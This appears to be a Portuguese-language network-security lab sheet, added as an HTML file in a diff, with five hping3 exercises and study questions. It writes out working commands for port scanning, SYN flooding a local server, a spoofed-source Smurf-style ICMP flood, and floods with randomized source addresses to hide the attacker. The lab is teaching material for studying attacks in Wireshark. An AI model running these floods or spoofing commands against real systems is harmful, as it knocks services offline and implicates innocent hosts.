@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>ATAQUES COM HPING3</title>
+  </head>
+  <body>
+    <h2>ATAQUES COM HPING3</h2>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><span
+          style="color: black;">VER: </span>Attacks to be performed Using
+        Hping3 (Packet Crafting) | by Ravi sharma | Medium</a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <h2>Exercicio 1:</h2>
+    <p>Determine as portas TCP abertas no kali</p>
+    <p>hping3 -S --scan 21-1000 127.0.0.1</p>
+    <p><br>
+    </p>
+    <h2>Exercicio 2:</h2>
+    <p>Teste a porta do servidor python e capture os pacotes gerados com
+      Wireshark</p>
+    <p>hping3 -S -p 9999 127.0.0.1</p>
+    <p><b style="color: #000099;">PERGUNTA</b>: O que esse comando está fazendo?</p>
+    <p><br>
+    </p>
+    <h2>Exercicio 3:</h2>
+    <p>Faça um ataque de SYN Flood contra o servidor.</p>
+    <p>hping3 -S -p 9999 127.0.0.1 --flood</p>
+    <p>Veja como o ataque afeta o desempenho do cliente.</p>
+    <p>Analise os pacotes com Wireshark e determine a frequencia de envio de
+      SYNs.</p>
+    <p><b style="color: #000099;">PERGUNTA</b>: Porque a aplicação Python não
+      acusa o recebimento das conexões durante o ataque?</p>
+    <p><br>
+    </p>
+    <h2>Exercicio 4:</h2>
+    <p>Faça um ataque to tipo SMURF e verifique o efeito no Wireshark.</p>
+    <p>hping3 --icmp --flood 1.2.3.4 -a 5.6.7.8</p>
+    <p><b style="color: #000099;">PERGUNTA</b>: O que esse ataque está fazendo?
+      Quais máquinas serão prejudicadas?</p>
+    <p><br>
+    </p>
+    <h2>Exercicio 5:</h2>
+    <p>Utilize endereços de origem randômicos para mascarar o seu ataque.</p>
+    <p>Use o wireshark para ver esse efeito.</p>
+    <p>hping3 -S -p 9999 127.0.0.1 --flood --rand-source</p>
+    <p><b style="color: #000099;">PERGUNTA</b>: O que o atacante espera
+      conseguir usando esse ataque?</p>
+    <p><br>
+    </p>
+    <h2><br>
+    </h2>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p></p>
+    <p><br>
+    </p>
+    <p></p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p></p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><a href="https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745"><br>
+      </a></p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+  </body>
+</html>
